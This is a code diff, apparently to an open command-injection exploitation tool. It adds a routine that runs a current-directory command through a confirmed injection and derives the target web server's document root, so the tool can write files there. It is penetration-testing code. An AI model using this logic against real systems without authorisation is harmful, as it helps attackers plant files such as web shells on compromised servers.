@@ -7136,6 +7136,54 @@ def web_root_from_leaked_path(url):
   return None
 
 """
+Ask the target where it is serving from, rather than reading it off a list of the usual places.
+
+Where a technique whose output comes back is already confirmed, the directory the script runs in is
+one command away, and the URL says how far under the document root that script sits - so the root is
+what is left of the one with the other taken off its end. An answer the target gave about itself is
+worth more than a candidate, the same as a leaked path is above; this one is asked for rather than
+waited for. Where the two do not line up - an alias, a rewrite, a script reached by a path it is not
+stored under - nothing is returned and the candidates are walked exactly as before.
+"""
+def web_root_from_target_cwd(url):
+  probe = settings.WEB_ROOT_PROBE
+  if probe is None or not url:
+    return None
+  cmd = settings.WIN_CURRENT_DIRECTORY if settings.TARGET_OS == settings.OS.WINDOWS else settings.CURRENT_DIRECTORY
+  # Asked in the state it was armed in. The time-based technique runs between the two and leaves its
+  # own flag standing, and the answer to this one is read off the page, not timed - left set, the
+  # read is the time-related one and comes back empty however well the command itself ran.
+  time_related = settings.TIME_RELATED_ATTACK
+  try:
+    settings.TIME_RELATED_ATTACK = False
+    answer = probe(cmd)
+  except Exception:
+    return None
+  finally:
+    settings.TIME_RELATED_ATTACK = time_related
+    # Asked once and then spent. A root worked out from here empties the candidate list, so a write
+    # failing on it comes back through this - and an answer that was wrong the first time is wrong
+    # again, which would leave the same root being offered for as long as it keeps failing. Spent,
+    # the second pass falls through to the leaked path and the menu, as it would have without this.
+    settings.WEB_ROOT_PROBE = None
+  lines = [line.strip() for line in str(answer or "").splitlines() if line.strip()]
+  cwd = lines[0] if lines else ""
+  # A shell that could not run it answers with its own error rather than a path.
+  if not re.match(r"\A([A-Za-z]:)?[\\/]", cwd):
+    return None
+  native_separator = "\\" if "\\" in cwd else "/"
+  cwd = cwd.replace("\\", "/").rstrip("/")
+  # What the URL puts between the document root and the script - the script's own name dropped,
+  # since a directory URL has none and one that names a script is not part of the path it sits in.
+  below = re.sub(r"/[^/]*\Z", "", _urllib.parse.urlparse(url).path or "").rstrip("/")
+  if below and not cwd.endswith(below):
+    return None
+  root = cwd[:len(cwd) - len(below)] if below else cwd
+  if not root:
+    return None
+  return (root + "/").replace("/", native_separator)
+
+"""
 Provide custom server's root directory
 """
 def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
@@ -7153,11 +7201,13 @@ def custom_web_root(url, timesec, filename, http_request_method, url_time_respon
         info_msg = "Trying '" + settings.WEB_ROOT + "' instead."
         settings.print_data_to_stdout(settings.print_info_msg(info_msg))
     else:
-      leaked = web_root_from_leaked_path(url) if url else None
-      if leaked:
-        info_msg = "Retrieved the web server document root: '" + leaked + "'."
+      # Asked of the target first, where a confirmed technique can carry the question: what it
+      # answers about itself settles the root outright, and a leaked path only happens to be there.
+      retrieved = web_root_from_target_cwd(url) or (web_root_from_leaked_path(url) if url else None)
+      if retrieved:
+        info_msg = "Retrieved the web server document root: '" + retrieved + "'."
         settings.print_data_to_stdout(settings.print_info_msg(info_msg))
-        settings.WEB_ROOT = leaked
+        settings.WEB_ROOT = retrieved
         settings.WEB_ROOT_CANDIDATES = []
       else:
         # Said where the menu below is about to be put, not on every pass that walks the same
